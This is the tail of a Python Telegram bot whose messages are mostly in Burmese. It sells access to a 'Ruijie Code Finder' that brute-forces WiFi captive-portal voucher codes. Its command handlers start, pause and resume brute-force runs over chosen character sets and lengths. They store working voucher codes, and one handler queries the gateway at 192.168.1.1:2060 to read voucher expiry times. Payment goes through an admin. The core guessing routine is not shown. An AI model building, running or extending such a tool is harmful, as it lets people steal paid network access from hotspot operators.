        welcome += f"💰 **အချိန်သက်တမ်း သို့မဟုတ် Code အရေအတွက် ဝယ်ယူရန်:**\n👉 ဆက်သွယ်ရန် - {ADMIN_USERNAME}\n\n"
        if not is_active:
            await message.answer(welcome + "⚠️ သင်၏ အသုံးပြုခွင့် ပြည့်သွားပါပြီ။ `/saved` ဖြင့် မှတ်တမ်းကိုသာ ကြည့်ရှုနိုင်ပါသည်။", parse_mode="Markdown")
        else: await message.answer(welcome, parse_mode="Markdown")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    text = (
        "📖 **Ruijie Code Finder (Alphanumeric-6) အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "၁။ **Setup လုပ်ခြင်း:**\n"
        "အရင်ဆုံး မိမိဖောက်လိုသော Portal ၏ URL အရှည်ကို `/setup <url>` ဖြင့်ထည့်ပါ။\n\n"
        "၂။ **စတင်ရှာဖွေခြင်း:**\n"
        "`/brute <mode> <length> <target_number>` ဖြင့် စတင်ပါ။\n"
        "   🔸 Mode `1` = Digit (0-9)\n"
        "   🔸 Mode `2` = Ascii-Lower (a-z)\n"
        "   🔸 Mode `3` = Ascii-Upper (A-Z)\n"
        "   🔸 Mode `4` = Ascii-Mix (a-z, A-Z)\n"
        "   🔸 Mode `5` = Alphanumeric (a-z, 0-9)\n"
        "👉 ဥပမာ: `/brute 1 6 5`\n\n"
        "၃။ **အခြေအနေကြည့်ခြင်း:** `/status`\n"
        "၄။ **Notification ဖွင့်/ပိတ်:** `/notify`\n"
        "၅။ **ရပ်တန့်ခြင်း/ရှင်းလင်းခြင်း:** `/stop` နှင့် `/refresh`\n"
        "၆။ **ရလဒ်ကြည့်ခြင်း & ဖျက်ခြင်း:** `/saved` , `/clear_saved`"
    )
    await message.answer(text, parse_mode="Markdown")

@dp.message(Command("setup"))
async def cmd_setup(message: types.Message):
    tg_id = message.from_user.id
    args = message.text.split(maxsplit=1)
    
    if len(args) < 2: return await message.answer("Usage: `/setup <session_url>`", parse_mode="Markdown")
    url_or_id = args[1].strip()
    
    if tg_id == ADMIN_ID and not url_or_id.startswith("http"):
        try:
            target_tg_id = int(url_or_id)
            target_doc = await get_user(target_tg_id)
            if target_doc and target_doc.get("session_url"): return await message.answer(f"🔗 **User `{target_tg_id}` ၏ Setup URL:**\n`{target_doc['session_url']}`", parse_mode="Markdown")
            else: return await message.answer(f"❌ User `{target_tg_id}` အတွက် Setup လုပ်ထားသော URL မရှိပါ။", parse_mode="Markdown")
        except ValueError: pass
            
    url = url_or_id
    if not url.startswith("http"): return await message.answer("❌ မမှန်ကန်သော လင့်ခ်ဖြစ်ပါသည်။ URL သည် http သို့မဟုတ် https ဖြင့် စတင်ရပါမည်။", parse_mode="Markdown")
    
    user_doc = await get_user(tg_id)
    old_setup_id = user_doc.get("current_setup_id") if user_doc else None
    new_setup_id = f"setup_{tg_id}_{int(time.time())}"
    
    update_data = {"session_url": url, "current_setup_id": new_setup_id, "is_running": 0}
    if old_setup_id: update_data["old_setup_id"] = old_setup_id
    await update_user(tg_id, update_data)
    
    user_db_path = get_user_db_path(tg_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            if old_setup_id:
                await udb.execute("DELETE FROM vouchers WHERE setup_id NOT IN (?, ?)", (new_setup_id, old_setup_id))
            else:
                await udb.execute("DELETE FROM vouchers")
            await udb.commit()
    
    if tg_id in stop_events: stop_events[tg_id].set()
    
    if tg_id in active_tasks:
        active_tasks[tg_id].cancel()
        del active_tasks[tg_id]
        
    init_user_state(tg_id)
    resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    
    await message.answer("✅ သင်၏ Portal URL Setup အသစ် ပြုလုပ်ပြီးပါပြီ!\n\n🗑️ သင့်အတွက် ယခင်မှတ်တမ်းဟောင်းများကို ရှင်းလင်းပြီး Session အသစ်စတင်ထားပါသည်။")

@dp.message(Command("notify"))
async def cmd_notify(message: types.Message):
    tg_id = message.from_user.id
    user = await get_user(tg_id)
    current_status = user.get("live_notify", 0) if user else 0
    new_status = 1 if current_status == 0 else 0
    
    await update_user(tg_id, {"live_notify": new_status})
    state_text = "ON 🟢" if new_status else "OFF 🔴"
    await message.answer(f"🔔 Live Notification စနစ်: **{state_text}**\n\nCode အောင်မြင်တိုင်း ချက်ချင်း Chat ထဲ ပို့ပေးမည့်စနစ်ကို ပြောင်းလဲလိုက်ပါသည်။", parse_mode="Markdown")

@dp.message(Command("brute"))
async def cmd_brute(message: types.Message):
    tg_id = message.from_user.id
    init_user_state(tg_id)
    
    if tg_id in active_tasks and not active_tasks[tg_id].done(): return await message.answer("❌ သင်၏ Account တွင် အခြား Task တစ်ခု Run နေပါသည်။ ယခင် Task ကို /stop ဖြင့် အရင်ရပ်ပါ။")
        
    args = message.text.split()
    if len(args) < 3:
        text = ("Usage: `/brute <mode> <length> [target_success_number]`\n\n**Modes:**\n`1` = Digit (0-9)\n`2` = Ascii-Lower (a-z)\n`3` = Ascii-Upper (A-Z)\n`4` = Ascii-Mix (a-z, A-Z)\n`5` = Alphanumeric (a-z, 0-9)\n\n👉 ဥပမာ: `/brute 1 6 5`")
        return await message.answer(text, parse_mode="Markdown")
    
    parsed_mode = parse_mode(args[1])
    if not parsed_mode: return await message.answer("❌ Invalid mode. Use 1, 2, 3, 4, or 5.")
    try: length = int(args[2])
    except: return await message.answer("❌ Invalid length.")
    
    target_success = None
    if len(args) >= 4:
        try: target_success = int(args[3])
        except: return await message.answer("❌ Invalid target success number.")

    if resume_states[tg_id]["mode"] == parsed_mode and resume_states[tg_id]["length"] == length and resume_states[tg_id]["current_idx"] > 0:
        resume_states[tg_id]["target_success"] = target_success
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="▶️ Resume from stopped point", callback_data=f"brute_resume_{parsed_mode}_{length}")], 
            [InlineKeyboardButton(text="🔄 Start Over", callback_data=f"brute_new_{parsed_mode}_{length}")]
        ])
        await message.answer(f"Pause detected for `{parsed_mode}` (length: `{length}`).\nDo you want to resume where you left off or start a new search?", reply_markup=kb, parse_mode="Markdown")
    else: 
        user_data = await get_user(tg_id)
        if user_data and user_data.get("is_running") == 1:
            return await message.answer("⚠️ ခွင့်မပြုပါ! သင်သည် လက်ရှိတွင် လုပ်ငန်းစဉ်တစ်ခုကို Run နေပါသည်။ ကျေးဇူးပြု၍ လက်ရှိ Run နေသည်ကို အရင်ဆုံး /stop သို့မဟုတ် /refresh ဖြင့် ရှင်းလင်းပါ။")
        
        await update_user(tg_id, {"is_running": 1})
        active_tasks[tg_id] = asyncio.create_task(brute_force_task(message, parsed_mode, length, target_success, is_resume=False))

@dp.callback_query(lambda c: c.data and c.data.startswith('brute_'))
async def process_brute_callback(callback_query: types.CallbackQuery):
    tg_id = callback_query.from_user.id
    try: await callback_query.message.edit_reply_markup(reply_markup=None)
    except: pass
        
    action, mode, length = callback_query.data.split('_')[1:4]
    length = int(length)
    target_success = resume_states.get(tg_id, {}).get("target_success")

    if tg_id in active_tasks and not active_tasks[tg_id].done(): return await callback_query.answer("Task ကြီး Run နေပါပြီ。", show_alert=True)
    
    user_data = await get_user(tg_id)
    if user_data and user_data.get("is_running") == 1:
        return await callback_query.answer("⚠️ ခွင့်မပြုပါ! သင်သည် အခြားနေရာတွင် Task Run နေပါသည်။ /refresh ပြုလုပ်ပါ။", show_alert=True)
    
    await update_user(tg_id, {"is_running": 1})
        
    if action == "resume": active_tasks[tg_id] = asyncio.create_task(brute_force_task(callback_query.message, mode, length, target_success, is_resume=True))
    elif action == "new": active_tasks[tg_id] = asyncio.create_task(brute_force_task(callback_query.message, mode, length, target_success, is_resume=False))
    await callback_query.answer()

@dp.message(Command("saved"))
async def cmd_saved(message: types.Message):
    args = message.text.split()
    target_tg_id = message.from_user.id
    
    if len(args) > 1:
        if message.from_user.id == ADMIN_ID:
            try: target_tg_id = int(args[1])
            except: return await message.answer("❌ Invalid TG ID")
        else: return await message.answer("⛔ သင်သည် အခြားသူများ၏ Code ကို ကြည့်ရှုခွင့်မရှိပါ။")

    user_doc = await get_user(target_tg_id)
    if not user_doc: return await message.answer("❌ User ကို မတွေ့ပါ။")
        
    c_id, o_id = user_doc.get("current_setup_id"), user_doc.get("old_setup_id")
    if not c_id and not o_id: return await message.answer("❌ Setup အချက်အလက် မရှိသေးပါ။")

    c_s, c_l, o_s, o_l = [], [], [], []
    user_db_path = get_user_db_path(target_tg_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            udb.row_factory = aiosqlite.Row
            if c_id:
                async with udb.execute("SELECT code, status FROM vouchers WHERE setup_id=? AND status IN ('SUCCESS', 'LIMITED')", (c_id,)) as c:
                    async for row in c:
                        if dict(row)["status"] == "SUCCESS": c_s.append(f"`{dict(row)['code']}`")
                        else: c_l.append(f"`{dict(row)['code']}`")
            if o_id:
                async with udb.execute("SELECT code, status FROM vouchers WHERE setup_id=? AND status IN ('SUCCESS', 'LIMITED')", (o_id,)) as c:
                    async for row in c:
                        if dict(row)["status"] == "SUCCESS": o_s.append(f"`{dict(row)['code']}`")
                        else: o_l.append(f"`{dict(row)['code']}`")

    if not any([c_s, c_l, o_s, o_l]): return await message.answer("❌ သိမ်းဆည်းထားသော Code မရှိသေးပါ။")

    warning_msg = ""
    if target_tg_id == message.from_user.id and message.from_user.id != ADMIN_ID:
        is_active = False
        if user_doc:
            if user_doc.get("approval_type") == "count": is_active = (user_doc.get("found_codes") or 0) < (user_doc.get("allowed_codes") or 0)
            else: is_active = time.time() < (user_doc.get("expires_at") or 0)
                
        if not is_active and user_doc:
            v_used = user_doc.get("saved_views_after_expiry") or 0
            if v_used >= 3: return await message.answer(f"⚠️ သင်၏ `/saved` ကြည့်ရှုခွင့် (၃) ကြိမ် ပြည့်သွားပါပြီ။ ထပ်မံကြည့်ရှုရန် သို့မဟုတ် အသုံးပြုရန် {ADMIN_USERNAME} ကို ဆက်သွယ်ပါ။")
                
            v_used += 1
            await update_user(message.from_user.id, {"saved_views_after_expiry": v_used})
            rem_views = 3 - v_used
            if rem_views > 0: warning_msg = f"\n\n⚠️ **အသိပေးချက်:** သင်၏ အသုံးပြုခွင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ။ ဤမှတ်တမ်းကို နောက်ထပ် **{rem_views} ကြိမ်** သာ ကြည့်ရှုခွင့် ရပါမည်。"
            else: warning_msg = f"\n\n⚠️ **အသိပေးချက်:** ဤသည်မှာ သင်၏ နောက်ဆုံးအကြိမ် ကြည့်ရှုခွင့် ဖြစ်ပါသည်။ ဤမှတ်တမ်းအား နောက်ထပ် ကြည့်ရှု၍ မရတော့ပါ။"

    msg_text = f"💎 **User {target_tg_id} ၏ သိမ်းဆည်းထားသော Codes များ:**\n\n" if target_tg_id != message.from_user.id else "💎 **သိမ်းဆည်းထားသော Codes များ:**\n\n"

    if c_s or c_l:
        msg_text += "🟢 **[ လက်ရှိ Setup မှ Codes ]**\n"
        if c_s: msg_text += "SUCCESS:\n" + ", ".join(c_s) + "\n\n"
        if c_l: msg_text += "LIMITED:\n" + ", ".join(c_l) + "\n\n"
        msg_text += "-------------------\n\n"

    if o_s or o_l:
        msg_text += "🟡 **[ ယခင် Setup အဟောင်းမှ Codes ]**\n"
        if o_s: msg_text += "SUCCESS:\n" + ", ".join(o_s) + "\n\n"
        if o_l: msg_text += "LIMITED:\n" + ", ".join(o_l) + "\n\n"

    for i in range(0, len(msg_text), 4000):
        chunk = msg_text[i:i+4000]
        if i + 4000 >= len(msg_text): chunk += warning_msg
        await message.answer(chunk, parse_mode="Markdown")

@dp.message(Command("limited_expiry"))
async def cmd_limited_expiry(message: types.Message):
    tg_id = message.from_user.id
    user_doc = await get_user(tg_id)
    if not user_doc: return await message.answer("❌ User ကို မတွေ့ပါ။")
        
    c_id, o_id = user_doc.get("current_setup_id"), user_doc.get("old_setup_id")
    if not c_id and not o_id: return await message.answer("❌ Setup အချက်အလက် မရှိသေးပါ။")

    limited_codes = []
    user_db_path = get_user_db_path(tg_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            udb.row_factory = aiosqlite.Row
            if c_id:
                async with udb.execute("SELECT code FROM vouchers WHERE setup_id=? AND status='LIMITED'", (c_id,)) as c:
                    async for row in c: limited_codes.append(dict(row)["code"])
            if o_id:
                async with udb.execute("SELECT code FROM vouchers WHERE setup_id=? AND status='LIMITED'", (o_id,)) as c:
                    async for row in c:
                        if dict(row)["code"] not in limited_codes: limited_codes.append(dict(row)["code"])

    if not limited_codes: return await message.answer("❌ စစ်ဆေးရန် LIMITED code မရှိပါ။")

    status_msg = await message.answer(f"⏳ LIMITED code ({len(limited_codes)}) ခု၏ သက်တမ်းကို စစ်ဆေးနေပါသည်...")

    connector = aiohttp.TCPConnector(limit=10)
    async with aiohttp.ClientSession(connector=connector) as session:
        results = []
        for code in limited_codes:
            url = f"http://192.168.1.1:2060/user/online_info?username={code}&usertype=wifidog"
            try:
                async with session.get(url, timeout=5) as req:
                    text = await req.text()
                    match = re.search(r"(\d{4}[-/]\d{2}[-/]\d{2}\s\d{2}:\d{2}:\d{2})", text)
                    if match: expiry = match.group(1)
                    elif len(text) < 50: expiry = text.strip()
                    else: expiry = "Unknown Format"
            except Exception: expiry = "Connection Error"
            results.append(f"`{code}` - Exp: {expiry}")
    
    msg_text = "⏱️ **LIMITED Codes သက်တမ်းများ:**\n\n" + "\n".join(results)
    
    try:
        if len(msg_text) > 4000:
            await status_msg.edit_text("✅ စစ်ဆေးပြီးပါပြီ။ အောက်တွင်ကြည့်ပါ။")
            for i in range(0, len(msg_text), 4000):
                await message.answer(msg_text[i:i+4000], parse_mode="Markdown")
        else:
            await status_msg.edit_text(msg_text, parse_mode="Markdown")
    except Exception:
        await message.answer(msg_text[:4000], parse_mode="Markdown")

@dp.message(Command("clear_saved"))
async def cmd_clear_saved(message: types.Message):
    tg_id = message.from_user.id
    user_db_path = get_user_db_path(tg_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            async with udb.execute("DELETE FROM vouchers") as c:
                deleted = c.rowcount
            await udb.commit()
        await message.answer(f"✅ သင့်အကောင့်ရှိ သိမ်းဆည်းထားသော Code အဟောင်းများ အားလုံး ({deleted} ခု) ရှင်းလင်းပြီးပါပြီ။")
    else:
        await message.answer("❌ ရှင်းလင်းရန် Code မရှိပါ။")

@dp.message(Command("status"))
async def cmd_status(message: types.Message):
    tg_id = message.from_user.id
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle": return await message.answer("❌ အလုပ်လုပ်နေသော Task မရှိပါ။")
        
    text = (f"📋 Task Status: {task_stats[tg_id]['status']}\n⚡ Speed: {task_stats[tg_id]['speed']:.0f}/sec\n"
            f"🔍 Checked: {task_stats[tg_id]['attempts']}\n💎 Found (Total): {task_stats[tg_id]['found']}\n")
    if task_stats[tg_id].get("target_success"): text += f"🎯 Target Success: {task_stats[tg_id]['success_count']} / {task_stats[tg_id]['target_success']}"
    await message.answer(text)

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    tg_id = message.from_user.id
    await update_user(tg_id, {"is_running": 0})
    
    if tg_id in stop_events:
        stop_events[tg_id].set()
        
    if tg_id in active_tasks:
        active_tasks[tg_id].cancel()
        del active_tasks[tg_id]
        
    if tg_id not in task_stats or task_stats[tg_id]["status"] == "Idle": return await message.answer("❌ အလုပ်လုပ်နေသော Task မရှိပါ။ (သို့သော် Lock ကိုမူ ရှင်းလင်းပေးလိုက်ပါပြီ)")
        
    task_stats[tg_id]["status"] = "Stopped"
    await message.answer("✅ ရောက်နေသောနေရာတွင် ရပ်တန့်လိုက်ပါပြီ။\n`/brute` ပြန်ရိုက်ပါက ဆက်လက်လုပ်ဆောင်နိုင်ပါသည်။")

@dp.message(Command("refresh"))
async def cmd_refresh(message: types.Message):
    tg_id = message.from_user.id
    
    if tg_id in stop_events: stop_events[tg_id].set()
    await update_user(tg_id, {"is_running": 0})
    
    if tg_id in active_tasks:
        active_tasks[tg_id].cancel()
        del active_tasks[tg_id]
        
    init_user_state(tg_id)
    resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    
    await message.answer("🔄 **Refresh အောင်မြင်ပါသည်!**\n\nသင့်၏ လက်ရှိ Run နေသော Task များနှင့် မှတ်ဉာဏ်များကို သန့်စင် ရှင်းလင်းပေးလိုက်ပါပြီ။ (Setup နှင့် Saved Code များ မပျက်ပါ)\n\n👉 `/brute` ဖြင့် အသစ်ကနေ ပြန်လည်စတင်နိုင်ပါပြီ။", parse_mode="Markdown")

# ==========================================
# 🌐 Main Execution
# ==========================================
async def main():
    await init_db()
    print(f"Starting {BOT_ID} (Ultimate Safe & Stable Engine)...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
